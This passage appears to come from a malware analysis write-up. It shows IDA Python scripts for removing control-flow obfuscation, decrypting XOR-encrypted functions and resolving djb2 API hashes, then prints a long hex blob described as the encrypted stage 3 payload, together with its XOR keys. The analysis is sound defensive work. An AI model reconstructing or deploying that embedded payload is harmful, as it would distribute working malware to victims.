ida_ua.create_insn(instruction_ea, instruction) else: instruction: ida_ua.insn_t = decode_instruction(instruction_ea) instruction_length: int = instruction.size if not instruction_length: print(f&quot;Failed to create an instruction at address {instruction_ea=:#x}&quot;) return # Append the current instruction address to the list instructions[instruction.ip] = instruction # Handle unconditional jumps current_instruction_mnemonic: str = instruction.get_canon_mnem() next_instruction: ida_ua.insn_t | None = decode_instruction(instruction_ea + instruction.size) if next_instruction is not None: next_instruction_mnemonic: str = next_instruction.get_canon_mnem() if (current_instruction_mnemonic == &quot;jnz&quot; and next_instruction_mnemonic == &quot;jz&quot;) or (current_instruction_mnemonic == &quot;jz&quot; and next_instruction_mnemonic == &quot;jnz&quot;): # Unconditional jump detected assert instruction.ops[0].type == ida_ua.o_near instruction_ea = instruction.ops[0].addr ida_ua.create_insn(next_instruction.ip) instructions[next_instruction.ip] = next_instruction continue if current_instruction_mnemonic == &quot;jmp&quot;: assert instruction.ops[0].type == ida_ua.o_near instruction_ea = instruction.ops[0].addr else: instruction_ea += instruction.size # NOP the remaining instructions for ea in range(begin, end): skip: bool = False for _, instruction in instructions.items(): if ea in range(instruction.ip, instruction.ip + instruction.size): skip = True break if skip: continue # Patch the address ida_bytes.patch_bytes(ea, b&quot; x90&quot;) if __name__ == &quot;__main__&quot;: main() . After this we can see that the next function address is built using some stack/ret manipulation. . Generic Opaque Predicate Patching . There is also this nice generic patching script from Alex: nopme.py. . Function Decryption . Some functions are encrypted. We can find the first one by following the obfuscated control flow until the first call. This call calls into a function which then calls the decryption function. The decryption function takes a size and a offset to the function that needs to be decrypted. The size is placed in the ecx register, and the function offset follows the call. . mov ecx, 0E7h ; &#39;√ß . The decryption itself is a single byte xor but the decryption key is moved into the edx register as a full DWORD (we only used the LSB). . mov edx, 76186250h . From this blog we have a simple deobfuscation script updated for our sample. This script didn&#39;t perform well for some reason so we ended up manually decrypting the functions! . import idc import idautils def xor_chunk(offset, n): ea = 0x400000 + offset for i in range(n): byte = ord(idc.get_bytes(ea+i, 1)) byte ^= 0x50 idc.patch_byte(ea+i, byte) def decrypt(xref): call_xref = list(idautils.CodeRefsTo(xref, 0))[0] while True: if idc.print_insn_mnem(call_xref) == &#39;push&#39; and idc.get_operand_type(call_xref, 0) == idaapi.o_imm: n = idc.get_operand_value(call_xref, 0) break if idc.print_insn_mnem(call_xref) == &#39;mov&#39; and idc.get_operand_type(call_xref, 1) == idaapi.o_imm: n = idc.get_operand_value(call_xref, 1) break call_xref = prev_head(call_xref) n = idc.get_operand_value(call_xref, 0) offset = (xref + 5) - 0x400000 xor_chunk(offset, n) idc.create_insn(offset+0x400000) ida_funcs.add_func(offset+0x400000) xor_chunk_addr = 0x00401118 # address of the xoring function decrypt_xref_list = idautils.CodeRefsTo(xor_chunk_addr, 0) for xref in decrypt_xref_list: decrypt(xref) . API Hashing . According to this blog we are expecting to see some API hashing using the djb2 algorithm. We can try to find this function by searching for the constant 0x1505. . Though the djb2 algorithm is used for the API hashing the malware also encrypts the hashes with a hard coded XOR key. In our sample the key is 0x76186250. . import requests hash = 0x8161735f def hash_djb2(s): hash = 5381 for x in s: hash = (( hash &lt;&lt; 5) + hash) + x return hash &amp; 0xFFFFFFFF print(hex(hash_djb2(b&#39;NtTerminateProcess x00&#39;) ^ 0x76186250)) . 0x8161735f . Extract Stage 3 . Decryption . There is a 32-bit and a 64-bit version of stage 3 stored consecutivly in the binary. The data is encrypted with a hard coded 4-byte XOR key, the decryption must be a multiple of four. The trailing bytes (if any) are then decrypted with a single byte XOR. In our sample the DWORD key is 0x76186250 and the single byte key is 0x50. . data_string = &#39;5058187647a21889fa5d103a51605c8eb0621a575b63149f64673087b5753166bb323066f2465570508c1e9f308e1c5d52dc136676a93b31549d0c9e008d6c3505292b1919566c995437f056be82f3023592574e888a58611262e79fa76387886fa5bcdd7fcb556510f48f569c5dcc79d5fd2ef15f87bc8a1cdf2605b6775d048d5ac6ac2286e2481bd8ec2b50f8e85d4c825f21e4c5f30012fd31f395d92876562f7a4b1c09e5d519dbaf7f9b5ecb86173edc19adf5e7e26fb7d0c8529b490a40434ff874b4bf14a7bc9a2f51a9aedc7268c6d775b4015e9e5d19c6d3586f26772cdf86d5f867ab0860c969c52c4b96c842930fd12e3c775062017569c5442db6e89cc9d8f241469d7477a86ee19adeb910fe4ed083a16cc9d9a42a50620e7ec3a7661d4c42dbded5c36f8b663f4d15db809b3b7d6499f5c1c309a82e6200917148992885fa01f9c3dfd60a67373d5fe1ba3b2cb1ac5aaf9f336e0bf353998fafe9920f728065e14b2570ccaff26be66a2dada4bdf16afb45303d5e7ff159d243fa65c1653b79be0ba67eb30b982bf465da01f265daae13fedfae13d4e50f31476f223754f28ead67bf3f9bba345242758e0ee22d8747ad08abc5e346580ef3b4ebb43a13e826208febcc5f2fefe2e8d3a999d2c02e7bd24e7d7ee4fc620016d26e14229bdc97827e212fd144328014d2e4fc7eedadc5e3936d3d8c50751488e638996fa3008a85aac789029dc797427bd2a793a196ab4d959ba1539896e55d8dd1a47dd3ea83fe70e77f51bfc2805be89da250a2d9c87a9e8bda6ec5c19740db077c05a53aab5f8706a15d81fe44927cfebc19234e8f6fa3fb942c9bfaff4092f095fe704ea97ba9d9b6789bd3bf78e3d6ad48dc96921384bcb55599a1b35398bcb94d95eed376acaf8978623868cad1fc504f7e34b09b82e45571a3e59f80e32ca74480e48602aedd3941b8109ce88dd6b85679f4c0797556ff68bf26b46bb4538af88e3c9b769798e768d2d30cdad1e7fab134e5725bf3985faf351741b9d8b9d0bef4d0004df7d6294ae4e0e3628b78e6e979374856f1e312afaa740eaa071889189b42e25285eb8de74a3f41a89786c502a17cfab1ac24cd17c16275f7318a89b942aee2897ae4a963e3f7276a91e4755670bd8667ddd18765c329da6d6f028c1ddcfc777662fa505ea10ff66ba8bf6756985899598a04853a7d1dfd9b593b8345aa980b6d8527684d3a99aa6aa70d0ec83d6bb3844a08bc71885ea4db336d4de1f267b639970923ccbadbf2ceac2f4a1c5133e7a69398acc8a8ad570e72a9c4feb69281e383b0e589037597dc628bb3ff28645444f9451abe470bca7af87e55e57bb26db2a777305fb979b9d61ceaa3bd5fe33c027b82b639dacd1137f7b68e7f1dfa2dfc94447e7ebe593a21d87a665fad1536910501228f3965496edec5ae41188846656ffc609fe25efcddb615e774feaa2e95e0bc2e95e710fd9f64e1fda7cc1f12d66f3c66357d5efe5bdb9b93768bf4d7a866208ab8c1ab1dfdfd4178d05d05fe65862d57b21c8a98e8b334bcbcc51cb8d1c6cb1a2f6946a894c966c7bbc2f61617d8e19cbf49e1bf4443ff1e16bc6fd63954e8708bc5adf93bf2a814f4b9eb09ae95b1db0a18ef947fff8084678ca797e938698b97da75d9b4efe02320d46fa79ed762dcb5c2f63874d4fa8b70c69c8274cbfc10be70ed4070aff105b192679497ca218271c486896e8cba8870c49cd5598b9b0770d781946c61658893ca7edce98268888dcc44d5a8c3fa253457d7f0fb53a3dbf854aff7e05466de88e9541cb0edaf107c969cc236c096ddb73a1614b0ddee6882fca7e94c7cf0f87ec77b95dac39304e7ddf868b9ef3b0d527cf1f8b3f63af4971602cc6d44cb67f37a61b26496efa606a8cea887464eb896f2c4339ab424a28e31c9689bfccfe9747ca651bb937bc8dad593aa8ccb12dcdadc3beff5cd12d1dac49338afddc768b1fcece9417cadf8c9f66cf4d21643cc6a448267b07a7bb23ed5f5bb7ee3efa806abceac870ec295e620a4b4e2a15534f9b0e0be31bcf75e40847a0c9a2ff83226fa2e9de3f39c27dde8f115da91e19f63665f834a27a292c9d39ed86b31a2f15d9aede41ffb99c64b36b1970707ec735f38273e9008bc32c1a871891935c4d3e3e920a87edcef97069d154966fbfaf1ad090a34b7b0b1be6fbc68ab4309907ceffcb2e9697c44cafb961289da8993675a8082dfd0178eea302fb62462e91d885c1ac805f385c1ac49a7dad27b12c795e020b8b4f3a15634f8b0ecbe3cbce75e5c846c0c9e2fb7326afa3b9db3f3ae27c3e8f715ce91f39f7266448305278d9281d383d82831a1f10a9abfe45afb8cc632f2ef84069bdfe1547cf7f8ba3989880f10200cf22fc83254b83b9bd5bbdfe18659fd15cb91ba9f37665e835127b89296d3dcd86931faf10f9ac9e4170f1f7e30eb92048fa7a2123f231a612d47c9a0a8710496f9110b842a3aef593fc04a12f139f3cbc4c493d7beaa5729685df2785a97f59c4058efd39092f59f4ac7d0be72e1f6ad722e1b7836a464526f77a6e92e38d6445881e42b7b8b02b14aa3d6716c4ef83b70721a08848cafcd66e00e8842cf5b361a416208faa0d60a867071f1e2792e7686f472e89e408ba09f2493dc61714b983cb9aa18ecab5693cb5d7406b7446bd9baf07f3f0ea6472f61b2f4fe441b772e56f96bbe7b4841ea0ab09e311e0fc12c12a5dd2500c7a115cda162bd224eb3a0ab9ae86811b037939adb2f109e79f245b4e24fe120db93f05ea8319cb624714fc9b861e01c5a9d8eb45e9a84392597f3740ea193b8b8721e77e0d11ac4279b472734c3288faa274b2306e9707adb939bb35c35911a74722b89db3718fd0a522bb6365b1b024c51f5fc53ef437474bd17c09051e0b7976a1b8e365b3303bae9745240e3ef9cff45fef7afa471a9df160bf7af3cd950ec170cfd127a91f01e71f37fb93058dd425ba61a60161054d7586d70db7023a325fa93e0015e9da4256e59ee5fe6dc77e14be1fbd60017073842d62c538aa3777d62f1dd00e98eb5526deaec5e0ba8f1115155ec8f8b927c07337074e69b0889c6041727fe34d78fd9e43e0f73e9c5fb0765e4274f45bc2cd9263c62aff4a02f58eb1bf3f28855240446a8862a4b41f593665ff5af6a6abbdb376a9db631f865c12f3306bb79f32c1cc8c79d428f1284aa62f314bb98eb164396f176bbbbf310a2680885d070f5bebbdaf318bb58f4a2bdc5f3e1b93c18236a0a9c5b1382f0317313f41c280b485d5d17f134638a3737bc10e0f1a75e139c168b0f6663b9849f1a3021e885526c33ba24e0d66de7d80269314b2038ba2a76401bdef0c9b07077f86bfab7b832f1cc72906d45572682d9e063f37462a247280d3941b501c240dc24460cfdbaeb54525cd119f56ec4825807e964524c49e6fd56e9cd43a1df6126b8ed3a0001662ffb093616fd1c4608f59666cf2725bca09f8bfb92b50b3bda7e509e170fd386e025dbbb2bb605344ffbeb6e1a52a1e1966e5b3393a142f016f301111d67b935611c423893bdb8533d952af0e8fbfbdc157650354e23aff12b6fd3a614fd867709f9777a0c45a6344e3d8ea131f08122c59f321325c1cc7e6d65afd172344223c29ff223d09f870aa29d73306751cf624936ff13f0a9d39b95fd276709a00143f17113faf1510bef8b3d52a1b411a93e4b7c9737317708d84d45900a18d65f62481c543248102a898e9f6e424bf45ea9eb9952383383d0d98f78376a089cc8736c714f92547dfadc172c530a4074038bda0c1e17ea9d97339a0f51359122d13bf19e686353dcdc93d42f9d8aee5425702ddfc218e021aff7aa3200357273a1f79eefcf59defd87e9d579c4a1f0197657f0adb9967a4d297d95ebf665123e06baf164f2aa92d4b8dc189f5a69724da494169f918f4e274638951cf80f316b697893aeb8feb2ccc918390d4b9af04b763f52f3f4304f26eb09f22a1d72d827dbb45667b447f1a5bab9f1a1b9b04a1c53c76a3b737e5c151b34c323a77cd19ffd93f371397f4a779a8b231e3aba4af650a6101c616370c12ae24bb014463777aff71efba1e7667eda1d97656b676a2f93db61fda9081ffbd7481aa3297395d92f65512daff59279fa923869527df37aa1fd819c03e1cb80537d427e9f8a4a3a387ae39f9f138f541f301d775403b625c77c0e378c92e25269e32353502318037208012c2e2d75a0b9b24a1c45bcf13d3937a41adf0250273600a524dde56e460031dd07e669fe5e0006bf3f70e252a076381a9fde46d00cbce3f47251a78268a10a027a222120d6b3dcf1f8780a3904a9e7e488af9d6aa45eee1dff10baeb545e00e23e06a8f43d3a785567d66aa258d3c4737350e34a3352c8eb21545082796d8a77f5250b1520da5f975af811f783d60d83680ee9fd2b96dba74590e9e9458b35952651ea86ee5e45e92f4b381c77ddf4376fdbac939eb82215c7e99a93a3078bbf9a79fbaead3a63407915ba9d89246be740dbac9d67dbb7a69fcfe7a98fe7a19b9a78e17c525862953274664b3e00b0495210f208af69f8a532db98910a745217e3909dab055517b167a06ce19eea76b19e80b9a06ad58fe19da4681ccfd59417f8ae611876d01f184aadb7f175182707e79566854f624623b05fefd5d7a14548fb04cb51b1f5fb26863848e728c29e38c922f1aad909721d2c53a0ca0f70dafc27092d7e4f156217f3c8a98945900b81486c6258f59560aa05d8e1e73f31aa502663e3f050a0fe398ed39ae70262e1d87d53a7489fc21b2a2fdbaa91fd03f541f3991601fdfcd31bb7b0d2514a2810aebfba6a5c77de2b497d6152df2b521e220ae28b56eedb929b88afb53e9f6139564590ea1c58dbe99a78e5725926ae32706938321827c98b5af201e2ff20bb1831f8ac3f95335361de26afd131d874c2281caf8b9a27d01e2df6896ef2a31af147376e307e548a61528604222f0655ebb7667461b82e78324edfbae872f546233b045a6df7da00955e3f52109a687772bb881703cb14a0eb749df18f9487687deac55c16e020c72f48e539b451df7857b20eaf2b9a897d4a27ff069e503a128bd657eec8247f161f8228dba94ffd808a876cd303c99c052a64ccd4b0a117949a9233505e719ec342d49e22939f76dc17e31a05078279db8a41bf21d5193f2a57e5125fefb6774d72938668796639bb60a9fb1c87410d87334826060a0a51b03652647ac3c4010a4a9b0a7476180871e2204a247e4e1c31280401cc6e489ec524514a288b1fee7d2423832cd1c29cc6022d9f1a632d04347aae82f6657fdf13bde9895a285cf61932751e9b714b1c22194178b8a50979b9b2e8dd70e6fa9ad3898bf4ecfb89b0d3849eabd8d672768a3d1f9f8662b59a258b6c375a0aee95b9ce5b5ef09da787f162b148900880563917f02787223a34495b1e20b8d0b9a9e19786611f7d6c6107895e01018e7182bb726c0277c151562f526c6d26081ad410e7f2411ab4181c4f304836d8d5716ec28b0467c97d30772a7e9cb6256858fdaf1d9ab05af99bb278a01c76d38e74ab99f0a452c2d393af8f1ba96ed5c388d152b3e89dee3ece9e127db9f7ba5511410a2e17c05fef8c52d47313c2ca6e59ffdb434104d01d19773a6617e291eb880cd3a4e6fedb424462d3a51aff895b4efd9fa59c52dcdc9ad4c96ef0d64c60f2727951a625d9e6add7a2fa561dd39c16083633d99f8790456bc92c19031fef4e7297b56b5323f9abc64ebc6be41f68c4df749e61d09f3195f268f32bbf9c468a270043ec9f40c3c74b0224063b14755ae7d5a94b594eeaa27342e3e61dca4c667ce82f42690a4f1f0245e1a35ee06717e5b863ba9aee4b6efceebed3d5e62b32c614bf3072dd272726256e5007b8061205b9987325b8674dff063cbabb0e89e61699099077d219b98989425949b8601abbbc68f16008891010d35e5e58246550f3901dec9d5649424d36eb14300637d01340736c6bd3d5bc0cd39a1a0270e1e0752479c96e7b66726cbb76f1730c73049d5be988ecbb6e726de4f1eab24a25a0e17c7ff23eda37f638f5f28b02218c652370325ce2073467fc06809a312c336d0a9acef6b8f2f09d4deb29a4a61001754635284866319c8bee508ff69e78f0706519291bbd2316111b2181042bbbf639edbaec9997515ff1f5d3ca690c4ce6f1d5d6922b063ca00f345e38211c7079e9a9492ae05a162da92605b2dccac3280894b6223424b85ba74fae4217f9c57d509f1a6269fdada242652547930ac61872610a8a836f15c3a34df012f79c7dc8e754296c5c2806929542cef07266a71a0fff247df2763932d59c688b88593a697321adf78b8c2bebc1b81ac32f9a7043aa9a7404dd368e8be911917b1f77b9de2177d18ebcd39e6eb8a2baf58a9e87b2decf88eb449b21eac34ea1aa1a9cd7f02576c72a09f8e712217536688d4268211c43640d924ec08b9fefda21149f9ae80f2be11a1ac72d88748c9f8a6b61bae5a99e05f29fcd6c9d8fcb298b4d9ac722d89f17332aa482d17964ed2a0f75c10915bdf72b30b9d94e53d78a0f4af05ffe102a2969726305898d2e000870028c03d2dc48808086b563811c5fe1dd639c1e892f06e1aa0948beabf7c742339f9962b98d2768d8dcd7a0576e256b2033541db2fd3e931d77b9ad8bee4adbecd295ea34ca018946f4ec523d05ab22c51f962f78adc1100256b9649aba6130f0c34de8e8e2f2bcbfdf78505ab0fc84a355d3766f784a6d189e3c8d8f9f14646a8763ab6a36016c5206ed7a28273a66498d714a5cab1071ebc85e080066daa094cd5bf47c75c4f3fe6fee57f2f9f2a840b601ef507396621827972219a20f2dd4beb9cc584fba50103a12020434d92336fb115048c4dde5b64ef93207ec4b7e1d405145f3e111d7892005d2e3cce03c1bcbb84b7a10de2b4c2c39374c85e762416604626c7891fb5079e68e26e2df48b4de14d40f9c6a8bcd60417b9d8d32485835e76b387c4390009f7488ff175e0325c5538cc7fad1adf046b9a0a109aea1222a747517f4ad9f80f7a0005928094a93a6908eaa9f688bbfe496e582b0f963a4fc9fbd44e4d1a60447b9ef20714deadb3abb5e480a7464b19cc1ce511a26dec19e1473980bbaa850f15d21586cdc5a92c60ae620c4210a5457303a11279a6b044748efd6c701325e1755d0f02ec1ba6af90e094286d1a37b35f1bf323c3aae6922dd04487599d09bc6ba4d929eac2df117f2b6ab2f51dd0a172cf12ba49223c244597277d47ac083fc1cef69c686327b9e56ee4ec6c227d39e4800583e08b8287590e9c9e1262265c7382678f3e7c07a54eaef5560d9241efb07631b80f92a56e43aed34762a3213f596747272afd5000db82c0d2903324fb113f550b0c0268c1783e838884ce398864832b021bc38ece85fce9e8bf932855ef3d199ca4c8a58275832c59f1ed6a2e632cc258d89c384743fc1cb338c1293387f0ace070153307001830ec7b82e99e3037b329f01da88e6af9d97c47c0477c47b8daf65eb49f01c57331bb1d38f1f888703593e6ff7f130f199f7625c8800f0069b1a4a926af266ed51eefda9348193e3344e91ca4d93a802eb44e0f5db879c40e847c023a41625c95cf50817ef4d77619360603aba4d564f104d253123df9e78d3d2782a88aff8068e07d5e0f1e465b64d9152a5f907ffff311c76ba721d33ca1679f38b16451c70f33a054c74c76f3b707265dee032ec5e8a42657dc1fc801147602d5fd4557601323282c784b146d47ca333d3a41a3d2587e682a3c40d9f44f6836380d9549d52e9eb29dba4499f40c08369028a8f7538636bc763b084fc0185a377f4faca27b900a4d5e0f0a2668b97509f53cb0ddcb8f75a71f930908d3a7834e55a60803c39f8698e97acbbea9043797cc4f7faf181932976d2a970a5db4b49fec5e3186da59d0c83a6766c9b44359bf82dc66ae7b935d072e16b0dc4bc46ab3842af609f9dd1ea629ee995d959f2e82702898d3f0700bfa6c823b998c78e96cf59e9db2da0cb5ce6a58910dc38d4798ee96ac1fdbab11166cfe23382527271ae65e0e6fbe1269509d19cdef5c068e4c9416abd76f443f11257f2f7024be64a5c00f24289014aaac2d060a4cdd9ef481f02b3923649f419261030a93e00bef26abc3eb15e23355189f461914ac1d2f01207e72eb668700824063258deba46f468b9720b5a022a116a194ed85d0cf6f25e732f10afda7ef81c14b7f15a6b7e7289f488403187353c24c970ebdb518b3cff34bd1947154aebfc508b7c0f44307046e1403a7e41336d05398b0c9a70f81e5e3a4041e5da72cf0ef942696f69339367af3038fc44ab5d55120d545602307255818e438d4b76938606882455fb6ae1d4c5d40a2e59cfa82463946e3043244b9859706d45130cbae6d213705654039b35032800f137a9572a2976799cbf06f44639266b9f608f205c60e25ff3395ae99e648d5856b9386f4205eb54420903a81c0c6f9124a1d5e0fb24464076105b7275f5fd9eebbf0e28cd2c081ee916e2b89ff091bd261a2697315a793f76bf72f75e5b8e00f2408b5c0f6e314dfdbada5454f38ba19689e9654a539f7e4f17666d393a227076609c9201db3f2ad05ee84cc865c24898dae3befc3837adc761560b9a74f80e78db2530e42b2c4e75969dc89d5b3e6a2f41079c0be1a149bb732092df06ebb2a70483896ed910a28b5d161cfd67891bfd275e1b8163a22bad36595e7023542bbf3bab3089e4531077d173297a905b1bb100d5f272f8a7689cc23217c184e85b3e7ef917c99b59d00a9ce99ef650c8e12d36ef457a53ba9b4d501644fd53b392ecf7fb9a9ed94266bd10ae800d5461e59d79e91ff3901b1d79e7a2f3732fc2f174d22b846c019d88e8e3e8048c03389171d3a51cf56f626da4d3a10cd81a68972e6589b044908956e6bcc2b23444587efb5c4a330864e9aed2d994518948ef597e00e95972d38a10a7b8d95477f02a38d702c01702111a617dd31b1c76246733075417cac651059930ae8f14f6018930ee16171021bb137274dd883ec7a8e1a662da38245f978c5aa8f1efe9e07ad0f34f84ba499e1d7a9be7e9512bbf69e308673adf9c7cd3a31cf5a95e6a86bb691bd43f4a5acb12a7f158f12d8cb507210bc23a06aae5d0dc9b6730530803d4c9bae55dd693932f2a6cf2e0890c3ebd8bbd369c95ee79ac746d953a62502880c49fd03bc35946fc6e863eaf4558f4bb8c0267245d95fb0f60f0e65d21ef164063f156e9799b135c1a673a5ca57284ed334d7a63f1aa701c2179e558625785c251c3ded13f2cdf6900aa0243d871f2d8d81bfb382d1a2c548932cc3ef0f0aa47fb20b9dd1206fb3ebd12777650f0e378ba4dd7cd13f01188c6cd717a1db486e6f593276edf53fb1e607eff5633a064df5728c9dd2433c6f7935d745013f54da8e89f2d547b23b6b0661af10f7b61fe162324d6257299c93352e823b07a6a72960889d7da071a6d5820f319e2217eb812228fe416264476958b5e9e743852fb162c9dad25643e2d59891925cce604d48e19a91c5139b120e081eb5b50f834fdb85e89e7d9688b3e594b1943e51e15d523111550faa74476e1a00caadc064f06c290918bdabb32c9f215b1213463e9f28a06d03c21a3b09e518a4dd4f83f299e54c0d39dd17f1ab1f22d8b83531312cd48626c57205a8156dde123bb73d072752f0ff166e19a91bcc18901195e635ca9574359c6d21bafc70761ca9d6c8f24cf5ae1d089962b20157922f19f388b54dd20b1baf2a28a4dc27a725efc42324f571162aa3e3a09dbdf6459426d68a41c3726e94c65f00fb0855e72badba1e6f9e35fd4628cc2b0912dfa90dff5d24a82117ba06c211817441c4ee9e8c8599198cafb637d511a1ec1e4db620507257c88fd281703d5bae76c3fa9b647399c8af17fba7de90a59c1ab49028910d7d25c5922b95251420e1b1859dba0a72f1460a1ee485d187914a34824112dac02060853fa42daf09bdc60d0d4fa26d9df72da63ddd43014b198d018459d0b079b054408af1ac67135138898d6885bf2ec1aa9d90f54083e9d52083d2cb8821062b96774ffa52049fa5b556ef006f1f0e802ad41fb0044f0c482c169a8daa37ae0db926028d5249efb51c9083ca56213c4a768912d16c3319fd25741df70d673c28123549a664270c45032e19dd4c08de9317ff56cc382182d391e1027d3458c5b4e23f2befae1f4e7e9621bb8116bf2f60b33727e00eb94c3e5eb9c03e8337279268e94ffa0fb424728e9da5d915fd24c2d4599b493324a2099273323d9f6d2993ec199451a0a8f0fdd661626c18e3a3b64ca043fd5a2667f53aa910fc9631ffd47e7d803c5e7ca084595f132c29d2fcfe63448d1d600dc9dd4116e79a5880e14d6e5015703d71173da7e9dd2d06a74609f2d00ab01f011a6b994f1a0bae7b11af6eb5dc779b7f107d2dec1f2ba897c060635f6df0ada1ce5d96b0fd5ece9aac659fe8214dd3a1cf38b1c0c1c497111eb39381c16d86626306b91649adba5a5d4c7c1ba61d349acdfa1c4b56e65ff1a77fd11366602cb48d4b94b8a22dbfa683c571d29ff51cb3cacbbe90953e2aa1a810600f364bb665958db59fba1010819cfba6892aec6cf192b2e094808c0374bdaa350083f56c7f06e511b8f60409a3af4aff09bc80259007825429bd0e0a0c5c5a9b06c63d672bcb08dd288840fd1eae45edb3828db768d1a08d3f1d513a25225767872620befa65c40eb0f23b94ca224dd1d1c3d2593e7c0f7e612a8708d9e55bde05a020139db0ceae7ca0273354a0b20c23c9d66c32142fa72bc87c63056218303b5865ce9f166d1f55bffba7218f9c1bb4f73a4ec9dfc74fccbd505c3a9c3cb5b2f0334f2310d580858fadb34215b316f8b0c5f11f05ed94ba81b582a9320dfe8505a8e623bb5cc37e741aff166bfa02831f81a89cf994f390a1caf89ccc0c9161e9db1e9845b24e9ded6dd6e5acacd8e04fb1586726a0030e7e71a7ca24749e365825072344f6de1658e511612d79065bccaf243e03c034670aff733e24fe1f866603a382754c15e1fe9bb423926681ef2b0e500db229266833e74a9e9fda2c8a2d82a65f0aa56dfba341271ba5a6cf37026eecf4f4d08576d7ee1081e27b0d116798e8a189d52e81b2e1e94d820102094aa4bd0c2786e692886008bf0e7b0324b3fbeb4bdad23521e58f3adfa3053381323b4d279fe529cd8346c186e813a654279e663923255d6907711286d854123588e1a33492507ef5d8e2c32727e639d7289d91fe489c3d4ca4631342e2fac324f213a7be703a8f69bb843cbe4e50a424a77b8961d2872423a21ac34c646af54dd9f8e589276aeaa17c090329cc38a6d9d8e4c5af0fe5526aad436c3e0241a396fd4baf393ac2753b266be125b4a2ae1ce4fcb1e000edb26000a5399de8eea2538fd3f461bb553899d95285b6f6e2639937e5303e89453cb233990f06c6831c33249f231426cd3a21c37894b91cc2259576e22b7f3585fd555d71844a016b63bc172d8e92c6e539123812e7593b07ba523d7011f15bef97e09dd5e8a98f10153bc3bf9310795e1e9e1a709901628da6893b406e9ebf6a94c6c7f10e810f29917ec9d53ef6877d05a36031037954c29ef7689da6080ec032023a32294906f0d658472dbe58295ea69054fcf44490245b4d17a857a191efa68019cce32c028d6ebdb1a8d911c77ba7abac4d2e239b59ee1a3fdb9ef8aacecb8e7e3e66c9f4353c27e96a2571ac0c5e820674433e67e00422885726ca9905e58f257e1541c91fd8e0ce22b6354f504a0cb6a38b9c4f783918d90fa7619760c31f09a52b9423edd241e26dd2138c5d77e3b83e361aedc5308f16e93b968dfa2e7a32c5fd406fb0363f0b689f8442051ef567303e9e0ee03334f27f179559f03eb00a2a13319da97ed62d6f58a2c5cd92761873a6042458b8ac91032ae52ff74f3706f607a4125000a13fed0c2d89afe1260230d32e3fbc000cafa706912ea97e9f09cd3799a1e03ccbb00c4f4aa26b42bd6bfea08f087e8a579eeb97eea6a7ee02a3791d6ba774264a33ad83e1c551190ac89c66172ae9b62829ffaf3472b7d8b0c82fa609904238810d5fbe3c885b9207128baf82cb5b82c41ca17e1e7745fee4c89af9df3cc01c31862508ab237780a145761d91c36692ade1030abb14d5aca61771059da025e211ba911e3e16ff01b5904b8893efb0760913f20d78221dd291901d204af9c0723119f58c39515e7f0999aca225bebd30cba84c8622135d8261c6e105f18e7229633c1a14219cfbee9e679e6922ba4da3e246edba540c4e295eecb7005c2725261f075b9e3fd8950be48267c7adb368f0a5f9b50d44bf7afdc91ba7f2ac6b5005b846751e8ca0014b5552417dbca2e739b92226c7a17c09261e855a1a7f34249649022644e54360caa9997f93e5d7a48521c5d1359a4c222a2dd3415c1c8a618b385a2bb6fce92a892d9b0c973e834da60e83fbd79dcad9c1b01acdb934b5fb96c711a2276e023e9990d459949e0371759e10a4def688963b023a02f7c957243e85c7eaf581c5c25615a9dbd2323b92e842934df238ded4de9d99da5a3f052f996c6eff2094152a00819458bc2c52500e9e289c6dcc218b9ebb99993e3b4cc5e0a1bf6724aec50b9a4d0258a7af4e0508ae09c9ac3f6c358a5bb886dc1307d5240f1b868e9657edba1352fbc47284408ea4586d927e479e6261daa89c8f4e9fa8bfec4539a8d76616b582d7ee1e0662cbcb09c8221939f92c41af59d84b18c34c61801cb2295420378ad62002df09cd5b65935886ae9f79f8bf350c4101765f3f0759fde453a3d26ff81b5dd201c26e51913c7a1f3721e938292f6885b1024a1c816c53a66983d6130727cf6136220dde3921d4190480cda6d37ec6c95ee28dd2019f410caf12002eb9ea9305b1776afff795a995ed1e9ac9b381a67122f02671a2f0a67e22ff267ea2ffa67f22fe267fa2fea67c22fb068872022691721e069d521ae692f221d6a7b24506c8b0c0ccc55b1414c5958481d5c9749936b005d8c5e28e860402b0863bd2b186a4324bfcb8b14894f232827608b9477b7a0b8&#39; #data_string = &#39;5036187647a21889fa5d1e12d6615c8ea0623a565b60149f1a8e1e471479b89d409f9877506c1a7a74460377b9661b7a1e02d37077e81ed83796f016a72e1a59b812f7521337e83e3f8b529954383056bc825d1a1d02c49a1e64f09d1026549b7428184a1f30c0611262e79fef6367806fa5bcdd7fcb556510f48f569c5dcc79d5fd2ef15f87bc8a1cdf2605b6775d048d5ac6ac2286e2481bd8ec2b50f8e85d4c825f21e4c5f30012fd31f395d92876562f7a4b1c09e5d519dbaf7f9b5ecb86173ed888a272e7e26fb7d0c8529b490a40434ff874b4bf14a7bc9a2f51a9aedc7268c6d775b451cea62aa18018dae31c5138e796ac9d086f78ac2777e0e12201004556b1a0e782098d3a1aa74ff75625b0fa38fd29e35452519e086f535bbf2a0b8492f2efea882f60af0e198e5c9bf4f88b6a9068e2f9cf4afba3ca0c9fe759466a8bb32e09045693ca9dd7279f2e2b05019394d32f3570d1e189d741bc66764885395cd13ccdee49ed8bcb9e1e2f23754ba9ae7338f9b812bbd727261fbb47d15a38fc2940fa0bc7795f1eea9d8805c05857c3828f8b04dd774a53784d8b37f471800be75741179839dc109539e245d257a06fd483e0c035cca5c4d4e5e772ad2d0f31476f223754f28ead67bf3f9bba345242758e0ee22d8747ad08abc5e346580ef3b4ebb43a13e826208febcc5f2fefe2e8d3a999d2c02e7bd24e7d7ee4fc620016d26e14229bdc97827e212fd144328014d2e4fc7eedadc5e3936d3d8c50751489a06f0eaa071889189b42e25285eb8de74a3f41a89786c502a17cfab1ac24cd17c19ce7c00ae3018532f0eb8cf5f36cbbf5ed2c5de0ddfd87a4d123b3a9db3dbea49f33abe3de13f5d8f99056d5053f99f0fa35ceafd83e84ebb214b8b9a000e3f3ed2efd35066b8308d131a134db33a7cc3efc5accc677057cf50185c9ee42bdc8852eb4c2ef90567cd3158febcc16bde1c516c5e4d726faa4e87da28ecf3bbf93c93dbe8ec323b3dca9188a9df316440a12a4f7ce2a215806caf5a4d62f1f85d7e5eec51edd2aa6d6fc6c88ef432f9e22e686abe4c2385fc6ba17536485069914ce059261f096a80ee118b1ae7c9ac744ce99f3b2a57cf13a4fbb8c17bb7d0309ad90ad98aabcc44859bfc2615eacf4ab76c36caefd31230042b9f75abbe7213de3799ec1ad0abaaa9d32f0e177abe36f7ed9f03d4238a9ce7395c5cf718b3d92792716c40994e83f622aee184ae91bbe7fe0ab2f42d04cd14dc210cd2e3509b58f112fcb51e2894279cd332059728de27eef1946dc757ffb90021